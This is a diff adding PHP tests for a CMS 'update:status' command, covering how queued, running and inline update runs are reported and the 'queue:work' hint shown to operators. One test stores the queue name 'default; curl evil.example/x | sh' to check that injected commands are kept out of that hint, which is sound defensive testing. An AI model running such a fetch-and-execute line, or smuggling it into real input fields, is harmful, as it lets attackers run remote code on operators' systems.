@@ -361,6 +361,97 @@ class UpdateStatusCommandTest extends TestCase
     }
 
     /**
+     * Test a queued run reports as waiting, exits successfully, and names the
+     * worker command that would move it along. A record stuck here almost
+     * always means no worker is running, which is the one failure the dispatch
+     * guard cannot detect from config.
+     *
+     * @since 2.8.0
+     */
+    public function test_reports_a_queued_update(): void
+    {
+        $store = new UpdateStateStore;
+        $store->markQueued( null, '1.0.0', 'redis', 'cms-updates' );
+
+        $this->artisan( 'update:status' )
+            ->expectsOutputToContain( 'Queued (waiting for a queue worker)' )
+            ->expectsOutputToContain( 'redis / cms-updates' )
+            ->expectsOutputToContain( 'queue:work redis --queue=cms-updates --tries=1' )
+            ->expectsOutputToContain( 'Nothing has been changed on this installation.' )
+            ->assertSuccessful();
+    }
+
+    /**
+     * Test a queued run that asked for "latest" says so rather than rendering
+     * the unresolved target as an unknown value.
+     *
+     * @since 2.8.0
+     */
+    public function test_a_queued_update_without_a_pinned_version_reports_latest(): void
+    {
+        $store = new UpdateStateStore;
+        $store->markQueued( null, '1.0.0', 'database', null );
+
+        $this->artisan( 'update:status' )
+            ->expectsOutputToContain( 'latest (resolved when the job starts)' )
+            ->assertSuccessful();
+    }
+
+    /**
+     * Test the queue a run came from stays visible once it is running, so an
+     * operator can still tell which worker to look at.
+     *
+     * @since 2.8.0
+     */
+    public function test_reports_the_queue_for_a_run_that_has_started(): void
+    {
+        $store = new UpdateStateStore;
+        $store->markQueued( '2.0.0', '1.0.0', 'redis', 'cms-updates' );
+        $store->begin( '2.0.0', '1.0.0' );
+        $store->markStep( UpdateStep::ComposerInstall );
+
+        $this->artisan( 'update:status' )
+            ->expectsOutputToContain( 'In progress' )
+            ->expectsOutputToContain( 'redis / cms-updates' )
+            ->doesntExpectOutputToContain( 'Nothing has been changed on this installation.' )
+            ->assertSuccessful();
+    }
+
+    /**
+     * Test a queue name that is not a plain identifier is dropped from the
+     * `queue:work` hint. Every other field is rendered as data; this one is
+     * rendered as a command the operator is invited to paste into a shell.
+     *
+     * @since 2.8.0
+     */
+    public function test_a_malformed_queue_name_is_not_rendered_into_the_worker_command(): void
+    {
+        $store = new UpdateStateStore;
+        $store->markQueued( null, '1.0.0', 'database', 'default; curl evil.example/x | sh' );
+
+        $this->artisan( 'update:status' )
+            ->expectsOutputToContain( 'queue:work database --tries=1' )
+            ->doesntExpectOutputToContain( 'curl evil.example/x | sh --tries=1' )
+            ->assertSuccessful();
+    }
+
+    /**
+     * Test an inline run reports no queue rows at all.
+     *
+     * @since 2.8.0
+     */
+    public function test_an_inline_run_reports_no_queue_details(): void
+    {
+        $store = new UpdateStateStore;
+        $store->begin( '2.0.0', '1.0.0' );
+        $store->markStatus( UpdateRunStatus::Completed );
+
+        $this->artisan( 'update:status' )
+            ->doesntExpectOutputToContain( 'Queued' )
+            ->assertSuccessful();
+    }
+
+    /**
      * Register the core provider so the update commands are available.
      *
      * @since 2.7.1
